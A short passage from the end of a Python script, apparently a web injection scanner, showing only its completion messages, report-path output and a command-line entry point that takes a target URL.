        progress.update(task12, completed=True)

    console.print(f"[green][*] Advanced A03 Scan completed in {datetime.now() - start}[/green]")
    console.print(f"[bold yellow][*] Check {OUTPUT_DIR}/a03_detailed_report.txt for comprehensive results[/bold yellow]")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <target_url>")
        sys.exit(1)

    main(sys.argv[1])
